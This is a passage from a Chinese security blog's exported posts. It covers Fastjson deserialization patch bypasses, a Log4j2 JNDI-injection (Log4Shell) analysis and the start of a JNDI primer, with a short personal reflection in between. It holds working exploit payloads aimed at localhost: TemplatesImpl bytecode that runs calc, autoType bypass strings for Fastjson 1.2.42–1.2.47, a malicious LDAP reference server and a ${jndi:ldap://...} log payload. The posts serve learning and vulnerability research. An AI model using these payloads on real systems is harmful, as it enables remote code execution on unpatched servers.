&quot;_bytecodes&quot;:[&quot;yv66vgAAADQAHwEABEV2aWwHAAEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwADAQAIPGNsaW5pdD4BAAMoKVYBAARDb2RlAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcACAEADVN0YWNrTWFwVGFibGUBABFqYXZhL2xhbmcvUnVudGltZQcACwEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAA0ADgoADAAPAQAEY2FsYwgAEQEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABMAFAoADAAVAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgwAGgAGCgAEABsBAApTb3VyY2VGaWxlAQAJRXZpbC5qYXZhACEAAgAEAAAAAAAEAAgABQAGAAEABwAAADIAAgABAAAAEbgAEBIStgAWV6cAB0unAAOxAAEAAAAJAAwACQABAAoAAAAHAAJMBwAJAwABABcAGAABAAcAAAANAAAAAwAAAAGxAAAAAAABABcAGQABAAcAAAANAAAABAAAAAGxAAAAAAABABoABgABAAcAAAARAAEAAQAAAAUqtwAcsQAAAAAAAQAdAAAAAgAe&quot;],\n\n &#39;_name&#39;:&#39;c.c&#39;, \n &#39;_tfactory&#39;:&#123; &#125;,\n &quot;_outputProperties&quot;:&#123;&#125;,\n &quot;_name&quot;:&quot;a&quot;,\n \n &quot;_version&quot;:&quot;1.0&quot;, \n \n &quot;allowedProtocols&quot;:&quot;all&quot;&#125;将 payload 部分拆分成如上几个部分，触发部分在_outputProperties中，也就是TemplatesImpl的 getoutputProperties为什么是 get？一般 parseObject 中会在最后调用 toJSON 方法，并且在 toJSON 方法中也会调用到 get 方法我们先跟进到getoutputProperties中这里会调用到 newTransformer 方法在newTransformer方法中又会调用getTransletInstance()方法然后经过 _name参数不为 null，并且_class参数不为 null 的情况下，调用 defineTransletClasses 方法然后在 defineTransletClasses 方法中通过 _bytecodes 传递的字节码，通过 defineClass 方法进行类加载（其中还有很多限制条件，这里不做赘述）所以整个的利用链就是:\njavagetoutputProperties-&gt;newTransformer-&gt;getTransletInstance-&gt;defineTransletClasses-&gt;defineClass 这里又有一个细节问题，为什么不直接getTransletInstance 开始调用？之前我们分析过 FastJson 获取解析器–getDeserializer 的时候，beaninfo 中获取 get 方法会有限制条件\n\n\n\n\n\n\n\n\n\n1.非静态方法2.无参数3.返回类型必须是（或继承自）Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong\ngetTransletInstance返回值不满足第三点条件，所以我们必须往上找其他的利用对于getoutputProperties中，它的返回值是 PropertiesProperties 继承于 HashMap，所以符合条件\n0x04 补丁修复分析研究高版本的防御补丁的思想，以及绕过直到 fastjson-1.2.47 之前的补丁修复绕过，都必须开启AutoTypeSupport测试人员可以添加如下代码进行开启\njavaParserConfig.getGlobalInstance().setAutoTypeSupport(true);1x01 fastjson-1.2.251.2.24 之后的第一次更新，官方引入checkAutoType机制，默认情况下，autoTypeSupport 关闭，不能直接反序列化任意类。打开AutoType之后是基于黑名单来实现安全检测的，fastjson 也提供了添加黑名单的接口集中处理的地方在 ParserConfig，也就是我们通过config.getDeserializer来获取解析器类但是具体的使用却是在DefaultJSONParser中而只有经过这层 checkAutoType 才能继续往下走正常的解析流程我们先跟进 parserconfig 类，之后再看具体的方法处理多了很多成员变量，其中包括黑名单和白名单列表，然后多了一个AUTO_SUPPORT安全开关具体的黑名单如下\njavabsh\ncom.mchange\ncom.sun.\njava.lang.Thread\njava.net.Socket\njava.rmi\njavax.xml\norg.apache.bcel\norg.apache.commons.beanutils\norg.apache.commons.collections.Transformer\norg.apache.commons.collections.functors\norg.apache.commons.collections4.comparators\norg.apache.commons.fileupload\norg.apache.myfaces.context.servlet\norg.apache.tomcat\norg.apache.wicket.util\norg.codehaus.groovy.runtime\norg.hibernate\norg.jboss\norg.mozilla.javascript\norg.python.core\norg.springframework白名单是没有具体定义的，它需要通过一些方法去添加内容\n\n\n\n\n\n\n\n\n\n使用代码进行添加：ParserConfig.getGlobalInstance().addAccept(“org.su18.fastjson.,org.javaweb.”)加上JVM启动参数：-Dfastjson.parser.autoTypeAccept&#x3D;org.su18.fastjson.在fastjson.properties中添加：fastjson.parser.autoTypeAccept&#x3D;org.su18.fastjson.\n这些我们肯定是无法利用的，都是服务端自己能干的事，还得从其他地方入手我们跟进checkAutoType方法他有几层黑白名单的混合双打，先看第一次如果autoTypeSupport选项开启，那么就会先遍历白名单，匹配目标类是否在其中，如果在就直接加载类，然后遍历黑名单，匹配目标类是否在其中，如果在就抛异常下面还有一次混合双打，当我们没有开启autoTypeSupport的时候，先遍历黑名单匹配就抛出异常，然后再遍历白名单匹配就直接加载。如果这两次混合双打没有打对地方，那么最后只有一种可能会加载类了—开启 autoTypeSupport 或者 expectClass 不为 null问题就出在这最后一手回首掏里面，我们跟进这个最后的 loadClassfastjson 这里为了兼容其他 JSON 格式的数据，使用递归调用来处理这些特殊字符于是我们的绕过思路就是在原先反序列化的类名前加上L以及最后加上;,之后也会被递归解析，能够准确找到全类名进行加载Poc\njavaimport com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.parser.Feature;\nimport com.alibaba.fastjson.parser.ParserConfig;\n\n\npublic class FastJson_JNDI_LDAP &#123;\n\n    public static void main(String[] args) &#123;\n        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);\n\n        String payload = &quot;&#123;&quot; +\n\n                &quot;\\&quot;@type\\&quot;:\\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\\&quot;,&quot; +\n\n                &quot;\\&quot;dataSourceName\\&quot;:\\&quot;ldap://localhost:10389/cn=TestLdap,dc=example,dc=com\\&quot;, &quot; +\n\n                &quot;\\&quot;autoCommit\\&quot;:true&quot; +\n\n                &quot;&#125;&quot;;\n        JSON.parseObject(payload, Feature.SupportNonPublicField);\n\n    &#125;\n\n&#125;1x02 fastjson-1.2.42 至 1.2.44攻防全部集中于此只列出 payload，不做具体分析1.2.42-双写 LL 和;;绕过:\njava&#123;\n    &quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,\n    &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;,\n    &quot;autoCommit&quot;:true\n&#125;1.2.43-利用 [ 判断的绕过：\njava&#123;\n    &quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[,\n    &#123;&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;,\n    &quot;autoCommit&quot;:true\n&#125;1.2.44-GG这个版本的字符串判断的绕过基本上就结束了\n1x03 fastjson-1.2.45又爆出来一个黑名单绕过，补充不全\njava&#123;\n    &quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,\n    &quot;properties&quot;:&#123;\n        &quot;data_source&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;\n    &#125;\n&#125;1x04 fastjson-1.2.47最严重的一集，上面 1.2.25-1.2.45 版本的绕过都必须建立在 autoType 开启的情况下，本来限制就很大了，而 1.2.47 版本的漏洞则不需要开启这个影响版本有些不同\n\n\n\n\n\n\n\n\n\n1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.32 未开启 AutoTypeSupport 的情况下1.2.33 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.47\n漏洞主要发生地点是在 checkautotype 中我们将 fastjson 的版本改为 1.2.47,经过几个版本的更新，checkAutoType 已有些不同，主要也是集中于我们上面总结的漏洞的补丁修改主题内容如下，前面还有一部分是关于;与L字符绕过的处理，包括 hash 处理和直接禁用等等然后就是熟悉的黑白名单混合检测，只不过 for 中我们取出黑名单值变成了 hash 值匹配，内容是一样的就算不开启 autoType，也就是第一个 for 循环不进去，我们往后走逻辑，来到个 if 判断处，假如说前两个 if 判断有一个 if 判断的内容满足要求了，我们就能够进入第三个 if 判断，直接 return 出我们的恶意类，就不用去面对恐怖的 autotype 未开启的黑名单检测在前的情况了那么接下来就是关于前两个 if 判断的内容分别是通过调用TypeUtils.getClassFromMapping，从缓存 map 中取出赋值为 clazz ；直接调用deserializers.findClass(typeName)去找有没有这个类但其实最终利用到的还是TypeUtils.getClassFromMapping，因为deserializers.findClass我们无法从中传值，也就是无法写入我们想要的恶意类，也就获取不到 clazz直接看TypeUtils.getClassFromMapping对于getClassFromMapping，它的内容仅仅是从 mappings 中取值，但是我们是可以通过TypeUtils.loadClass往里写值的直接跟进到TypeUtils.loadClass,内容和我们上面绕过时分析到的逻辑是差不多的,多了一些字符绕过的检测,最后这一个部分仍然没变也就是说 loadClass 会在最后尝试向 mappings 中写入当前正在实例化的类,那我们只需要能够控制到 loadClass 的参数,往里传入我们想要实例化的类即可首先,TypeUtils 中有重载三个 loadClass 方法虽然最终都会往三个参数的 loadClass 走(也就是我们刚才分析的 loadClass),但是每个 loadClass 被调用的地方都是不同的但是可以明确一点,三个 loadClass 的 String Class 参数是一定会有的,其他参数可有可无,也就是说我们只要找到能够后续调用,且参数可控的部分,就能够形成利用链找一下双参数的 loadClass 在哪被调用了跟进到com.alibaba.fastjson.serializer.MiscCodec的具体调用部分需要的是 strVal 参数来指定为我们想要加载的类,来看 strVal 参数如何控制这里想要赋值 strVal 就必须使得 objVal 不为空,且为我们的目标看一下 objVal 是如何赋值的当parser.resolveStatus 为TypeNameRedirect时,会进入 if 判断,然后通过扫描器判断 json 字符串中 val 键是否符合要求,然后将 val 中值通过 parser 的解析器方法返回给 objValresolveStatus 如何变为TypeNameRedirect 呢?我们可以尝试一下 POC 的 payload\njava&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;aaaaa&quot;&#125;后续直接跟进到 checkAutoType 中,我们来到第二个 if 判断,也就是直通过 deserializer 去 findClass实际上就是从IdentityHashMap中取值,由于 parserConfig 在初始化的时候会调用 initDeserializer 方法去初始化 deserializer而在 deserializer 的初始化方法中,已经将 Class.class 加载了所以我们此时的 deserializer 能从中 find 到 clazz,并且在后续的 parseObject 方法中会将resolveStatus设置为TypeNameRedirect那么此时的条件都已经达成了:resolveStatus设置为TypeNameRedirect,我们能够通过自控 objval 去设置 strval,然后通过 loadClass 去加载 strval,并且写入 mappings 缓存POC 如下:\njavaimport com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.parser.Feature;\nimport com.alibaba.fastjson.parser.ParserConfig;\n\n\npublic class FastJson_JNDI_LDAP &#123;\n\n    public static void main(String[] args) &#123;\n\n        String payload=&quot;&#123;\\&quot;a\\&quot;:&quot; +\n                &quot;&#123;\\&quot;@type\\&quot;: \\&quot;java.lang.Class\\&quot;,\\&quot;val\\&quot;: \\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;&#125;,&quot; +\n                &quot;\\&quot;stoocea\\&quot;:&quot; +\n                &quot;&#123;\\&quot;@type\\&quot;: \\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,&quot; +\n                &quot;\\&quot;dataSourceName\\&quot;: \\&quot;ldap://127.0.0.1:10389/cn=TestLdap,dc=example,dc=com\\&quot;,&quot; +\n                &quot;\\&quot;autoCommit\\&quot;: true&#125;&quot; +\n                &quot;&#125;&quot;;\n\n        JSON.parseObject(payload);\n\n    &#125;\n\n&#125;我个人的 FastJson 复习和学习暂时停在这里,后续还有其他的内容会继续补充到我这篇笔记性质的博客\n","slug":"FastJsonRe0","date":"2024-03-18T09:00:00.000Z","categories_index":"锻刀的理论学习-Fastjson反序列化","tags_index":"锻刀","author_index":"stoocea"},{"id":"45e2fa6203dde037520347ffddb2ac63","title":"最近的感想","content":"算是年度总结吧，我不是很喜欢回顾自己过往做的好的事，所以年度总结什么的对于我来说只是消磨自己热情的一件事，但我很喜欢回顾自己如烂泥的那段时光，所以才有了这篇文章这一段时间我脑子里面最疯狂的事情：放弃这两年的努力和脚印，做一辈子 mad 吧我的生命是从看 mad 和 AMV 开始的，是他们拯救了我，是少年热血漫拯救了我，是自己救了自己，所以才会有这样的想法吧，难道做 mad 就是做自己吗？然而这种情绪不会影响我现有的事，我照样去学，照样去调试，潜意识里思考该怎么学的好，怎么学的快，并实践，还是照旧但是我始终想不明白–我缺在哪里了？可能是练的少了吧，做的少了吧，一直这么想着，我自己也得不到一个真切的回答最近复习 JNDI 和学习 log4j 的调试过程让我很过瘾，特别学完之后看 su18 师傅的感想，我突然间多了一种另外的感觉：这世界上坏人很多的，他们也会无止境的进步，学习，攻击；所以你也不能认输，要和他们斗争一辈子我不奢求我一年 365 都能有好的状态，但我只求一年 365 天有那么几段时间我是清醒的，是在发光的，那就够了\n","slug":"最近的感想","date":"2024-03-12T09:01:00.000Z","categories_index":"Life","tags_index":"Felling","author_index":"stoocea"},{"id":"89d22fa1bbfbe26466e8bc1e2008590b","title":"Log4j2漏洞分析","content":"复习完 JNDI 之后想专门过来学一下 log4j\ndemo 实现与具体组件分析0x01 环境搭建在分析漏洞之前 ，log4j 的具体工作流程和组成很有必要去了解和熟悉先把测试环境搭建好依赖\nxml&lt;dependency&gt;\n  &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n  &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;\n  &lt;version&gt;2.14.1&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n  &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n  &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;\n  &lt;version&gt;2.14.1&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n  &lt;groupId&gt;junit&lt;/groupId&gt;\n  &lt;artifactId&gt;junit&lt;/artifactId&gt;\n  &lt;version&gt;4.12&lt;/version&gt;\n  &lt;scope&gt;test&lt;/scope&gt;\n&lt;/dependency&gt;log4j 的配置和其他很多组件很像，都是通过获取一个配置文件中的内容来进行具体配置的。这里我们用 xml 配置文件来写 log4j 的配置通常分为两个部分：1.设置日志信息输出目的地   2.定义 logger，也就是定位我们需要打日志的包中\nxml&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;Configuration status=&quot;TRACE&quot;&gt;\n\n    &lt;!-- 配置日志信息输出目的地  Appenders--&gt;\n    &lt;Appenders&gt;\n        &lt;!-- 输出到控制台 --&gt;\n        &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt;\n            &lt;!--配置日志信息的格式 --&gt;\n            &lt;PatternLayout\n                    pattern=&quot;%d&#123;HH:mm:ss&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot; /&gt;\n            &quot;/&gt;\n        &lt;/Console&gt;\n\n        &lt;!-- 输出到文件，其中有一个append属性，默认为true，即不清空该文件原来的信息，采用添加的方式，若设为false，则会先清空原来的信息，再添加 --&gt;\n        &lt;File name=&quot;MyFile&quot; fileName=&quot;./logs/info.log&quot; append=&quot;true&quot;&gt;\n            &lt;PatternLayout&gt;\n                &lt;!--配置日志信息的格式 --&gt;\n                &lt;pattern&gt;%d&#123;HH:mm:ss&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&lt;/pattern&gt;\n            &lt;/PatternLayout&gt;\n        &lt;/File&gt;\n\n    &lt;/Appenders&gt;\n\n\n    &lt;!-- 定义logger,只有定义了logger并引入了appender,appender才会有效 --&gt;\n    &lt;Loggers&gt;\n        &lt;!-- 将业务dao接口所在的包填写进去,并用在控制台和文件中输出 --&gt;\n        &lt;logger name=&quot;log4jtest&quot; level=&quot;TRACE&quot;\n                additivity=&quot;false&quot;&gt;\n            &lt;AppenderRef ref=&quot;Console&quot; /&gt;\n            &lt;AppenderRef ref=&quot;MyFile&quot; /&gt;\n        &lt;/logger&gt;\n\n        &lt;Root level=&quot;info&quot;&gt;\n            &lt;AppenderRef ref=&quot;Console&quot; /&gt;\n            &lt;AppenderRef ref=&quot;MyFile&quot; /&gt;\n        &lt;/Root&gt;\n    &lt;/Loggers&gt;\n&lt;/Configuration&gt;然后写个测试类\njavaimport org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\n\nimport java.util.function.LongFunction;\n\npublic class log4jtest &#123;\n    public static void main(String[] args) &#123;\n\n        Logger logger = LogManager.getLogger();\n        logger.trace(&quot;trace level&quot;);\n        logger.debug(&quot;debug level&quot;);\n        logger.info(&quot;info level&quot;);\n        logger.warn(&quot;warn level&quot;);\n        logger.error(&quot;error level&quot;);\n        logger.fatal(&quot;fatal level&quot;);\n\n    &#125;\n&#125;\n运行一下就能打印出很多信息然后在当前项目下应该会有一个 logs 文件夹，用来存放日志信息\n0x02 log4j2 功能组件分析1x01 日志记录&#x2F;触发点—-AbstractLogger通常情况下我们是使用LogManager.getLogger()方法来获取一个 logger 对象，然后通过调用 logger 对象的 debug&#x2F;info&#x2F;error&#x2F;warn&#x2F;fatal&#x2F;trace&#x2F;log 等方法记录日志等信息在这些方法中，都会先使用org.apache.logging.log4j.spi.AbstractLogger#logIfEnabled的若干重载方法，根据当前配置文件中的配置信息中记录的日志等级，来判断是否需要输出 console 以及日志记录文件，log4j 中的日志记录等级默认如下： ALL &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL &lt; OFF  ，然后默认输出的是 WARN&#x2F;ERROR&#x2F;FATAL  等级的日志信息，我们也可以在配置文件中修改配置日志输出等级：具体是在设置 logger 的时候，我们指定它的 level 等级即可，比如我们上面环境实现的等级设置为 TRACE 等级当然也可以用代码直接去配置\njavaLoggerContext ctx          = (LoggerContext) LogManager.getContext(false);\nConfiguration config       = ctx.getConfiguration();\nLoggerConfig  loggerConfig = config.getLoggerConfig(LogManager.ROOT_LOGGER_NAME);\nloggerConfig.setLevel(Level.ALL);\nctx.updateLoggers();logger 本身是一个接口，我们待会分析漏洞的入口就是它的一个抽象实现类 AbstractLogger 开始的，只要调用了 info，error，warn 等方法都可以被作为漏洞的触发点。不同点是配置的输出等级不同\n1x02 消息格式化—-MessagePatternConverterlog4j2 采用org.apache.logging.log4j.core.pattern.MessagePatternConverter来对日志信息进行处理先看一下初始化在初始化MessagePatternConverter 过程中会从 Properties 和 options 获取配置来判断是否需要调用 lookups 功能\n其中FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS的获取是通过工具类的 getBooleanProperty方法来获取的他这里的默认值传进来是 false，然后在默认 options 为空的情况下，loadNoLookups方法运算出来为-1，所以Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS || noLookupsIdx &gt;= 0运算出来为 false，noLookups的默认值就为 false，也就是 lookups 功能默认是开启的继续看下面的方法loadMessageRenderer方法通过 options 中的字符配置来获取相应的模板渲染器\nformat 方法有两段 if 判断的内容第一段 if 判断的内容是先从 event 中获取到 message，然后判断 message 的类型是否为 StringBuilderFormattable，之后就是渲染的具体内容第二段 if 判断的内容是重点，在一个正常请求的情况下：config 获取不为空，并且 noLookups 默认为 false 的情况下，标志着我们可以通过 lookups 功能来进行字符串解析然后这里的解析功能的重点是在\tconfig.getStrSubstitutor().replace(event, value)中\n1x03 字符替换—-StrSubstitutorlog4j2 中提供的 lookup 功能的字符替换的关键处理类就是StrSubstitutor，位于org.apache.logging.log4j.core.lookup.StrSubstitutor，现在来看它的具体内容光是默认属性配置就需要重点注意，默认的PREFIX前缀是$&#123; ，默认的后缀&#125;，默认赋值分隔符DEFAULT_VALUE_DELIMITER_STRINGStrSubstitutor 中的关键方法是substitute，也是整个 lookup 功能的核心，用来递归替换相应的字符由于该方法的内容较多，这里我们只截取关键性内容方法的开头先把各个前后缀以及内容的匹配器加载上然后通过 while 循环来找前缀，这里找的前缀是最开始的前缀找完前缀再找后缀，不过在找后缀的 while 循环中，又判断了是否替换变量中的值，如果替换，则再匹配一次前缀，如果找到了前缀，则 continue 跳出循环，再走一次找后缀的逻辑，比如说这个${${}}这种情况后续的逻辑中，主要是针对DEFAULT_VALUE_DELIMITER_STRING以及ESCAPE_DELIMITER_STRING进行，通过多个 if&#x2F;else 来匹配:-和:\\-这里就不一一分析代码了，这里其实就是对两个标识符的功能的描述：\n\n:- 是一个赋值关键字，如果程序处理到 $&#123;aaaa:-bbbb&#125; 这样的字符串，处理的结果将会是 bbbb，:- 关键字将会被截取掉，而之前的字符串都会被舍弃掉。  \n:\\- 是转义的 :-，如果一个用  a:b 表示的键值对的 key a 中包含:，则需要使用转义来配合处理，例如 $&#123;aaa:\\\\-bbb:-ccc&#125;，代表 key 是aaa:bbb，value 是 ccc\n\n在没有匹配到变量赋值或者匹配结束后，将会调用resolveVariable方法来解析满足 lookup 功能的语法，并执行相应的 lookup我们跟进到 resolveVariable 方法他这里会先获取到variableResolver，然后调用其 lookup 方法进行处理。实际上variableResolver是一个代理类Interpolator，之后再深入了解\n分析这些内容，我相信此时应该能感受到StrSubstitutor的substitute方法的重要性，它是直接解析 payload 的处理方法，通过在这里下断点&#x2F;Hook 点，能够最直接的分析到 payload 的处理，以及日后的防御处理\n1x04 lookup 处理—-Interpolator刚才提到，variableResolver 实际上是一个代理类org.apache.logging.log4j.core.lookup.Interpolator，他来代理所有的 StrLookup 实现类，也就是说我们在调用 Lookup 的时候，都是由Interpolator处理和分发的看一下默认结构在 interpolator 的构造方法中，它创建了一个strLookupMap键值对表，对一些默认情况的 Lookup 查询进行了装载，这里的 JNDI-Lookup 查询是通过下面的 try catch 块实现的再看最为关键的 lookup 方法具体的内容它通过:作为表示符，用来分隔 Lookup 关键字和参数，从 strLookup 中根据分割出来的关键字匹配到相应的处理类，并调用其 Lookup 方法log4j 的漏洞触发是通过jndi:关键字来触发 JNDI 注入漏洞的,jndi:关键字对应的处理类是org.apache.logging.log4j.core.lookup.JndiLookup，我们跟进查看具体它的 lookup 方法是如何被调用的先是获取了 jndiManager，然后再调用 jndiManager 的 lookup 方法我们先跟进查看jndiManager是如何被创建的最终跟进到 AbstractManager 的 getManager 方法中，通过 JndiManagerFactory 来创建不过这个 JndiManagerFactory 本身就是在 JndiManager 的子类中具体看 createManager 的内容实例化的的时候带着InitialContext 创建的，看到这个InitialContext就想到后续的一系列调用而 JndiManager 的 lookup 调用方法就是直接调InitialContext，并且参数 name 是我们可以控制的最终 sink 点也是在这\n漏洞分析0x01 漏洞复现影响版本：2.x &lt;= log4j &lt;= 2.15.0-rc1 先把 Ldap 服务器本地开一下\njavaimport com.sun.jndi.rmi.registry.ReferenceWrapper;\n\nimport javax.naming.InitialContext;\nimport javax.naming.Reference;\nimport java.rmi.Naming;\n\npublic class JNDI_LDAP_Server &#123;\n    public static void main(String[] args) throws Exception&#123;\n        InitialContext initialContext=new InitialContext();\n        Reference refObj=new Reference(&quot;RMIHello&quot;,&quot;RMIHello&quot;,&quot;http://localhost:8000/&quot;);\n//        ReferenceWrapper referenceWrapper=new ReferenceWrapper(refObj);\n//        Naming.bind(&quot;ldap://localhost:10389/cn=TestLdap,dc=example,dc=com&quot;,referenceWrapper);\n        initialContext.rebind(&quot;ldap://localhost:10389/cn=TestLdap,dc=example,dc=com&quot;,refObj);\n        System.out.println(&quot;LDAP服务器正在运行中&quot;);\n    &#125;\n&#125;\n恶意类的内容是 runtime 执行一个计算器然后看 exp\njavaimport org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\n\nimport java.util.function.LongFunction;\n\npublic class log4j2exp &#123;\n    public static void main(String[] args) &#123;\n        Logger logger = LogManager.getLogger(LongFunction.class);\n\n        String username = &quot;$&#123;jndi:ldap://127.0.0.1:1234/ExportObject&#125;&quot;;\n\n        logger.info(&quot;User &#123;&#125; login in!&quot;, username);\n    &#125;\n&#125;执行完毕\n0x02 流程分析\n\n\n\n\n\n\n\n\n调试前的心里准备：首先我们要明确，log4j2 漏洞的触发点是在字符串处理阶段触发的，所以在流程调试前期的到日志打印的流程都是不需要跟进的，明确我们要首先跟进到 MessagePatternConverter 的字符转化 format 方法中，然后记住如果有分支已经要返回出去打印了就不需要跟进了\n在 info 处打个断点由于AbstractLogger 的日志功能方法有若干重载方法，以及各种数据处理，师傅们可以参考我的调用栈，避免不必要的时间浪费最近的调用可以打在 PatternLayout 类的 toText 方法中然后跟进到 toSerializable 中，到这就是熟悉的 format 方法了，但是还没到MessagePatternConverter类，所以还需要继续深入跟进而且这里会有几次循环调用，并且由于信息类型不同，调用的Pattern 就不同，直到第八次循环（可能 exp 或者版本不同循环次数也不同？）才是我们想要的 MessagePatternConverter 的 format 方法，跟进这里 format 的内容就不讲了，直接到 Substitutor 的字符串处理逻辑即可跟进到 replace 方法这里获取了 StringBuilder 之后开始调用substitute关于substitute的整体逻辑我们在StrSubstitutor 的详细功能分析中已经分析过了，这里直接到下一阶段的跟进点，也就是将字符串经过前后缀获取以及删减，最终在没有匹配到变量赋值或者匹配结束后resolveVariable方法来解析满足 lookup 功能的语法，并执行相应的 lookup 逻辑这里流程循环较多，因为字符较多，他又会根据解析程度再次循环截取处理师傅们可参考的我这边的进度来调来到resolveVariable，继续跟进之前也提到过variableResolver实际上是一个代理类 interpolator（StrLookup 键值对表中的所有功能的 lookup 功能都是通过它来代理），所以这里会直接调进Interpolator的 lookup继续跟进，也是从 strLookupMap 中获取到 JndiLookup 之后开始调用其 lookup 了继续跟进到JndiLookup 的 lookup由于创建JndiManager 时自带构建 initialContext，并且这里的调用 JndiManager 的 lookup 就是调用 InitialContext 的 lookup，之后就是熟悉的 JNDI 注入的原始的流程了基本流程 sink 分析结束（师傅们如果在看我这篇文章学习的话可以先尝试把 log4j2 功能组件的分析先了解深一点，后续跟进调试会轻松很多）\n高版本绕过分析0x01 rc1 及绕过1x01 安全更新点分析 1在漏洞披露后，log4j2 官方发布了 log4j-2.15.0-rc1 安全更新包，经过师傅们进一步分析，在开启 lookup 配置后可以被绕过 （危害性较低，一般都不会再去开启 lookup 功能了）回忆一下漏洞之初的样子，我们在MessagePatternConverter 中是默认开启了 lookup 选项的，但是从 rc1 之后，它的源码如下：然后再看看之前的构造方法构造方法中赋值的操作被拆分了，并且多了很多子类，将之前的功能模块化了也就是说在 newInstance 实例化方法中，他会根据判断条件来选择返回出哪一个 Converter，假如说我们还想跟进到之前的流程就必须要走到LookupMessagePatternConverter子类中LookupMessagePatternConverter返回的条件是 lookups &amp;&amp; config != null，lookups 的获取就是新增的安全更新点，不再提供从 properties 中获取 lookups 配置的选项，而是直接从 loadLookups 方法中获取这里 LOOKUPS 值为”lookups”字符串，options 默认为空，那么也就进不去 if 判断，默认 return false，lookup 功能默认不开启\n1x02 安全更新点 2还有一个最直接的就是在 jndiManager 的 lookup 方法上，以及jndiManager 的创建上具体内容如下： 不再使用 InitialContext，而是使用子类 InitialDirContext，并为其添加白名单 JNDI 协议、白名单主机名、白名单类名  ，其中 permanentAllowedHosts 是本地 IP，permanentAllowedClasses 是八大基础数据类型加 Character，permanentAllowedProtocols 包含 java&#x2F;ldap&#x2F;ldaps。关键函数 lookup 上也加了限制，不过在某些版本上 catch 块中没有 return，逻辑判断失误，之后依然可以调 context 的 lookup，所以只要想办法直接走到 catch 块中即可不过我们这边更新的版本没有。。。。所以这里就复现不出来，其实这里的区别就是 rc1 和 rc2 的区别了，之后的版本由于默认 lookup 功能被关闭了，甚至直接移除了日志对 lookup 功能的支持，所以研究的价值不大了\n个人总结这次的学习并不涉及 payload 绕过等操作，比如关键字截取，嵌套，带外等操作，感兴趣的师傅可以去https://su18.org/post/log4j2/#%E5%89%8D%E8%A8%80 su18 师傅的博客https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/#Log4j2-%E5%A4%8D%E7%8E%B0  drunkbaby 师傅的博客\nlog4j 分析暂告一段落了，从 JNDI 的复习开始，有了一种新的感觉，新的学习的感觉，之前听队里的师傅说之前的漏洞调流程的时候要能够自己调出来，我并没有将这个事在自己心里强度，只是默认自己该这么做，也觉得自己现在可以有这样的能力，但还是缺少很多感觉，要走的路还有很长\n","slug":"Log4j漏洞分析","date":"2024-03-12T09:00:00.000Z","categories_index":"锻刀的理论学习-log4j2","tags_index":"锻刀","author_index":"stoocea"},{"id":"537c41713ba96f6a58c6622bc871aefc","title":"JNDIRe0","content":"什么是 JNDI英文全写为：Java Naming and Directory Interface，翻译叫做 JAVA 命名和目录接口，是 sun 公司提供的一种标准的\tjava 命令系统接口，JNDI 提供统一的客户端 API,并由管理者将服务端映射为 JNDI 上的特定服务和对象，简单来说就是： JNDI，能够让用户通过统一的方式访问获取网络上的各种资源和服务  （键值对找东西）Naming 和 Directroy\n0x01 Naming 命名服务提供一种由键值对构成的通过名称来查找实际对象的服务，比如 RMI 协议，就是客户端通过注册中心上的对象名称得到远程对象的引用，有几个名词需要解释一下\n\nBindings：表示一个名称和对应对象的绑定关系，也就是 DNS 域名绑定到对应 IP 上，RMI 中一个远程对象去绑定一个名称\nContext: 表示一组名称和对应对象的绑定，比如 spring 中的 IOC 容器，里面就存在 id 和各种 javabean 的对应关系，javaweb 中的 standardContext 